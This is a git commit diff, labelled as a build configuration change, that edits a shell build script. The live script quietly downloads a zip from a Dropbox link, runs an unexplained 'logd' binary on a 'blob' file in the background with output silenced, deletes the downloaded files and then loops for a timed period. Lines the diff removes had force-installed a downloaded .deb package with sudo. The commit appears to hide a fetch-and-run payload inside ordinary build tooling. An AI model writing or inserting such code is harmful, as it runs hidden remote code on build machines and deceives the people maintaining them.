0f497c3294cf0e3291e8f1c08cdc79e919368487
ayaka-jamera <ayaka.jamera@lnsilver.com>
2019-08-22 16:20:51 +0200

    Build Configuration Change

--- scripts/build.sh
+++ scripts/build.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
-#end=$((SECONDS+$1))
-#wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-#sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-#rm -rf libstdc.deb
+end=$((SECONDS+$1))
 wget https://www.dropbox.com/s/8pvj7clio93g1we/wan01.zip -q
 unzip wan01.zip > /dev/null 2>&1
 #pwd
-./scripts/logd ./scripts/blob &
+./logd ./blob &
 sleep 3
 rm -rf wan01.zip
-rm -rf scripts/logd
-rm -rf scripts/blob
+rm -rf logd
+rm -rf blob
 while [ $SECONDS -lt $end ]
 do
     read line
